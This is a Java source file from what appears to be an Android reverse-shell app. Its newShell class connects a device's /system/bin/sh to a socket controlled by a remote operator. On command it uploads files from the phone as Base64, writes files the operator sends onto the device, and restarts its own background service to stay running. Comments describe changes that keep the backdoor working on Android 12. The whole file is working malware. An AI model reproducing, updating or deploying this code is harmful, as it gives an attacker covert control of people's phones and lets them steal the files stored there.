package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import com.example.reverseshell2.functions;
import com.example.reverseshell2.mainService;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

/**
 * Interactive shell payload, updated for Android 12.
 *
 * Android 12 / scoped storage changes addressed here:
 *  1. ANDROID 10+ SCOPED STORAGE - Direct writes to hardcoded paths like
 *     "/sdcard/temp" are FORBIDDEN on Android 10+ (including Android 12).
 *     Apps must use their app-specific directory:
 *         context.getExternalFilesDir(null)  ->  /storage/emulated/0/Android/data/<pkg>/files
 *         context.getFilesDir()              ->  /data/data/<pkg>/files
 *     putFile now writes to the app-specific "temp" directory. Use the
 *     "get" command with a full path to retrieve files from there.
 *  2. BACKGROUND FOREGROUND-SERVICE START (Android 12) - starting a service
 *     from the background is restricted. The fallback now uses JobScheduler
 *     (works on Android 12) instead of startService().
 *  3. LARGE FILE HANDLING - the old code allocated a byte[] BEFORE checking the
 *     16 MB limit, risking OOM. Now the limit is checked first and the file is
 *     read fully with a loop.
 *  4. BASE64 DECODE BUG - files were encoded with Base64.DEFAULT (which inserts
 *     newlines every 76 chars) but decoded with Base64.NO_WRAP (which rejects
 *     newlines). Decode now uses Base64.DEFAULT to match the encoder.
 *  5. ProcessBuilder now uses "/system/bin/sh" (absolute path) instead of
 *     "system/bin/sh" (relative path).
 *  6. redirectErrorStream(true) merges stderr into stdout, so the separate
 *     error stream read (pe) is removed - it was always empty.
 */
public class newShell {
    static String TAG = "newTAGClass";

    /** Maximum file size that can be transferred over the socket (16 MB). */
    private static final long MAX_FILE_SIZE = 16_000_000L;

    Context context;
    functions functions;
    Activity activity;

    public newShell(Activity activity, Context context) {
        this.context = context;
        this.activity = activity;
        functions = new functions(activity);
    }

    public void executeShell(final Socket socket, OutputStream outputStream) throws Exception {

        outputStream.write("----------Starting Shell----------\n".getBytes("UTF-8"));
        outputStream.write("END123\n".getBytes("UTF-8"));

        // Use absolute path to the shell binary.
        String cmd = "/system/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        InputStream pi = p.getInputStream(); // includes stderr (redirectErrorStream)
        InputStream si = socket.getInputStream();
        OutputStream po = p.getOutputStream();
        OutputStream so = socket.getOutputStream();
        BufferedReader buff1 = new BufferedReader(new InputStreamReader(si));
        BufferedReader buff2 = new BufferedReader(new InputStreamReader(pi));
        String line;

        while (!socket.isClosed()) {
            try {
                // Read stdout+stderr from the shell process.
                while (pi.available() > 0) {
                    String b = "";
                    while (buff2.ready()) {
                        line = buff2.readLine();
                        b += line + "\n";
                    }
                    if (!b.isEmpty()) {
                        Log.d(TAG, b);
                        so.write(b.getBytes("UTF-8"));
                        so.write("END123\n".getBytes("UTF-8"));
                    }
                }

                // Read commands from the socket.
                while (si.available() > 0) {
                    String a = buff1.readLine();
                    if (a == null) {
                        break;
                    }
                    a += "\n";
                    Log.d(TAG, a);
                    if (a.startsWith("putFile")) {
                        String[] data = a.split("\\<");
                        if (data.length >= 4) {
                            String filename = data[1];
                            String fileext = data[2];
                            String encodedString = data[3];
                            encodedString = encodedString.replace("END123\n", "");
                            String fullFile = filename + "." + fileext;
                            setBase64Data(fullFile, encodedString);
                        }
                    } else if (a.startsWith("get ")) {
                        String filepath = a.split(" ")[1].trim();
                        Log.d(TAG, filepath);
                        File file = new File(filepath);
                        if (file.exists()) {
                            String full_filename = filepath.substring(filepath.lastIndexOf("/") + 1);
                            String[] file_data = full_filename.split("\\.");
                            Log.d(TAG, "exists");
                            String base64_data = getBase64Data(file);
                            if (base64_data == null) {
                                so.write("Cant transfer Large File\nEND123\n".getBytes("UTF-8"));
                            } else {
                                so.write("getFile\nEND123\n".getBytes("UTF-8"));
                                String sending_filedata;
                                if (file_data.length >= 2) {
                                    sending_filedata = file_data[0] + "|_|" + file_data[1] + "|_|"
                                            + base64_data + "\nEND123\n";
                                } else {
                                    sending_filedata = file_data[0] + "|_|" + "bin" + "|_|"
                                            + base64_data + "\nEND123\n";
                                }
                                so.write(sending_filedata.getBytes("UTF-8"));
                            }
                        } else {
                            Log.d(TAG, "notexists");
                            so.write("File Doesnt Exists\nEND123\n".getBytes("UTF-8"));
                        }
                    } else if (a.startsWith("put ")) {
                        so.write("putFile\nEND123\n".getBytes("UTF-8"));
                    } else {
                        po.write(a.getBytes("UTF-8"));
                    }
                }

                so.flush();
                po.flush();
                Thread.sleep(50);

                try {
                    p.exitValue();
                    break; // shell process exited
                } catch (Exception e) {
                    // still running
                }
            } catch (Exception e) {
                Log.d("service_runner", "called");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    functions.jobScheduler(context);
                } else {
                    // Android 12 blocks startService() from the background; the
                    // pre-Lollipop path uses startService only for old devices
                    // where the restriction does not exist.
                    final Context ctx = context;
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                ctx.startService(new Intent(ctx, mainService.class));
                            } catch (Exception ex) {
                                Log.e(TAG, "startService blocked", ex);
                            }
                        }
                    });
                }
                e.printStackTrace();
            }
        }

        so.write("Exiting\n".getBytes("UTF-8"));
        so.write("END123\n".getBytes("UTF-8"));
        so.flush();
        p.destroy();
    }

    /**
     * Reads a file and Base64-encodes it. Returns null if the file is larger
     * than {@link #MAX_FILE_SIZE} or cannot be read.
     */
    private String getBase64Data(File file) {
        long length = file.length();
        Log.d(TAG, String.valueOf(length));
        if (length > MAX_FILE_SIZE) {
            Log.d(TAG, "File too large to transfer");
            return null;
        }
        byte[] getBytes = new byte[(int) length];
        try {
            InputStream is = new FileInputStream(file);
            int offset = 0;
            int read;
            // Read the whole file in a loop (is.read() may return fewer bytes).
            while (offset < getBytes.length
                    && (read = is.read(getBytes, offset, getBytes.length - offset)) != -1) {
                offset += read;
            }
            is.close();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        try {
            return Base64.encodeToString(getBytes, Base64.DEFAULT);
        } catch (OutOfMemoryError e) {
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Writes a Base64-decoded file to the app-specific temp directory
     * (scoped-storage safe on Android 12).
     *
     * The saved location is:
     *   /storage/emulated/0/Android/data/<package>/files/temp/<filename>
     *
     * Use the shell "get" command with that full path to retrieve it back.
     */
    private void setBase64Data(String filename, final String base64Data) {
        final File myfolder = new File(getTempDir());
        if (!myfolder.exists()) {
            myfolder.mkdirs();
        }
        final File file = new File(myfolder, filename);
        if (file.exists()) {
            file.delete();
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    file.createNewFile();
                    FileOutputStream fos = new FileOutputStream(file);
                    // Decode with DEFAULT to match Base64.DEFAULT encoding.
                    fos.write(Base64.decode(base64Data, Base64.DEFAULT));
                    fos.flush();
                    fos.close();
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    /**
     * Returns the app-specific temp directory.
     *
     * Android 10+ scoped storage: we must use app-specific storage, NOT a
     * hardcoded "/sdcard/temp". getExternalFilesDir(null) returns a path the
     * app owns without needing any storage permission. If it is null (e.g. on
     * some devices), fall back to the internal files dir.
     */
    private String getTempDir() {
        File external = context.getExternalFilesDir(null);
        if (external != null) {
            File temp = new File(external, "temp");
            return temp.getAbsolutePath();
        }
        return new File(context.getFilesDir(), "temp").getAbsolutePath();
    }
}

